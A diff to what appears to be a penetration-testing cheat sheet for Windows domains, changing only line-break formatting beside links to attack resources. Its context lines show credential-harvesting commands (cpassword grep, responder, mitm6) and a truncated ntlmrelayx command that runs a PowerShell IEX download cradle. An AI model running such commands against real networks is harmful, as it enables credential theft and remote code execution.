@@ -166,7 +166,7 @@ grep -r "cpassword" . 2>/dev/null
 ```Shell
 responder -I tun0 
 ```
-#Inveigh  - Responder Windows version
+#Inveigh  - Responder Windows version \
 https://github.com/Kevin-Robertson/Inveigh.git
 
 
@@ -229,7 +229,7 @@ impacket-ntlmrelayx  -tf target.txt -smb2support -c "powershell IEX(New-Object N
 ```Shell
 mitm6 -d yuncorp.local
 ```
-NTLM
+NTLM \
 https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds
 
 
@@ -410,8 +410,7 @@ Ciphers +aes128-cbc
 
 
 ## Priv
-https://github.com/SecWiki/windows-kernel-exploits
-
+https://github.com/SecWiki/windows-kernel-exploits \
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
 #PowerUp.ps1
